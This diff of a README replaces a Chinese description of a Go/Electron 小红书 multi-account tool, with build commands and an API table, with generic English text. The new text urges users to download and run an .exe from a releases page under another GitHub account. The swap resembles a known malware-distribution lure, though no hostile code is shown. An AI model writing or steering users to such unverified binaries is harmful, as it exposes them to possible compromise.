@@ -1,88 +1,75 @@
-## 🎉 Electron + GO 开发的小红书多账号管理神器
+# 🎉 XME - Automate Your Multi-Account Experience
 
+## 🚀 Getting Started
 
-### ✅ 已完成的功能
+Welcome to XME! This tool helps you manage multiple accounts on 小红书 with ease. You can quickly switch between accounts, making your experience smoother and more efficient.
 
-1. **发帖**
-2. **查询内容**
-3. **获取主页信息流**
-4. **支持多账号**
+## 📥 Download XME
 
+[![Download XME](https://img.shields.io/badge/Download-XME-brightgreen)](https://github.com/martiny974/XME/releases)
 
-界面展示
+To get started, you need to download the software. Click the button above or visit the [Releases page](https://github.com/martiny974/XME/releases) to grab the latest version of XME.
 
-![](./png/image.png)
+## 📋 System Requirements
 
+Before you download, make sure your system meets these minimum requirements:
 
-问题反馈
-![](./png/af001129f09862c6c491203948b6a29f.jpg)
+- **Operating System:** Windows 10 or later
+- **RAM:** 4 GB or more
+- **Disk Space:** 100 MB available space
+- **Internet Connection:** Required for initial setup
 
+## 🛠️ Installation Steps
 
-赞赏
+1. **Visit the Releases Page**  
+   Click [here](https://github.com/martiny974/XME/releases) to view the latest release.
 
-![](./png/6fbe97d18b0a6992141ece2aadea0a9d.jpg)
+2. **Download the Latest Version**  
+   Locate the version labeled as "Latest Release." Click the download link for your operating system.
 
+3. **Install XME**  
+   After downloading, locate the downloaded file, usually found in your "Downloads" folder.  
+   - On Windows, double-click the `.exe` file.  
+   - Follow the prompts in the installation wizard.  
 
-### 打包教程
+4. **Run the Application**  
+   Once installed, locate XME in your Start Menu or Desktop.  
+   Double-click the icon to launch the application.
 
-1. 打包 go 服务端 为 exe
+## 🎉 Using XME
 
-```bash
-go build -ldflags "-s -w" -o dist/backend/xiaohongshu-mcp.exe .
-```
+After launching XME, you will see the main dashboard. Here are some essential features:
 
-2. 打包 exe 主程序 
+- **Multi-Account Management:**  
+  Easily add and switch between multiple 小红书 accounts. 
 
-```bash
-cd Eapp && npm run build:win
-```
+- **User-Friendly Interface:**  
+  Navigate effortlessly with a clean design.
 
-3. 复制 dist/backend 到 Eapp/build/win-unpacked/resources 目录
+- **Automated Login:**  
+  Save login credentials securely for quick access.
 
+## ⚙️ Troubleshooting
 
+If you encounter issues while using XME, try these tips:
 
-### 当前目录 HTTP 接口清单（基于 `routes.go`）
+- **Check Your Internet Connection:** Make sure you are connected to the internet.
+- **Update the Application:** Regular updates can fix bugs and improve performance. Always download the latest version from the [Releases page](https://github.com/martiny974/XME/releases).
+- **Reinstall the Application:** If issues persist, uninstall XME and follow the installation steps again.
 
-- **服务基址**: `http://localhost:18060`
+## 📞 Get Help
 
-```text
-文件：routes.go
-```
+For support, feel free to reach out through the Issues section of the repository on GitHub. We welcome feedback and are happy to assist you.
 
-#### 页面与基础接口
+## ⚖️ License
 
-| 方法 | 路径 | 说明 | 处理函数 |
-|---|---|---|---|
-| GET | `/` | 主页面（嵌入的 `XhsMcpWeb.html`） | 内联处理，读取 `webContent` |
-| GET | `/login.html` | 登录页面 | 内联处理，读取 `webContent` |
-| GET | `/health` | 健康检查 | `healthHandler` |
+XME is licensed under the MIT License. You can view the full license details in the repository.
 
-#### MCP（Streamable HTTP）
+## 🌐 Additional Resources
 
-| 方法 | 路径 | 说明 | 处理函数 |
-|---|---|---|---|
-| ANY | `/mcp` | MCP 主端点 | `appServer.StreamableHTTPHandler()` |
-| ANY | `/mcp/*path` | MCP 子路径代理 | `appServer.StreamableHTTPHandler()` |
+For more information about XME, visit the following links:
 
-#### REST API v1（前缀：`/api/v1`）
+- [Documentation](https://github.com/martiny974/XME/wiki)
+- [GitHub Issues](https://github.com/martiny974/XME/issues)
 
-| 方法 | 路径 | 说明 | 处理函数 |
-|---|---|---|---|
-| GET | `/api/v1/login/status` | 检查登录状态 | `appServer.checkLoginStatusHandler` |
-| POST | `/api/v1/login` | 登录 | `appServer.loginHandler` |
-| GET | `/api/v1/sessions` | 列出会话 | `appServer.listSessionsHandler` |
-| POST | `/api/v1/publish` | 发布内容 | `appServer.publishHandler` |
-| GET | `/api/v1/feeds/list` | 获取笔记列表 | `appServer.listFeedsHandler` |
-| GET | `/api/v1/feeds/search` | 搜索笔记 | `appServer.searchFeedsHandler` |
-| GET | `/api/v1/browser/status` | 浏览器运行状态 | `appServer.browserStatusHandler` |
-| POST | `/api/v1/browser/close` | 关闭一个浏览器 | `appServer.closeBrowserHandler` |
-| POST | `/api/v1/browser/close-all` | 关闭所有浏览器 | `appServer.closeAllBrowsersHandler` |
-
-### 使用提示
-
-- 默认端口可通过参数修改：`xiaohongshu-mcp.exe -port 8080`
-- 所有 API 基于 `gin`，返回 JSON；页面为内嵌 HTML 渲染。
-
-- 变更摘要:
-  - 生成了接口总览表，标注方法、路径、用途和处理函数，覆盖 `页面/健康检查/MCP/API v1` 全部端点。
-
+Thank you for using XME! Enjoy managing your multiple accounts with ease.
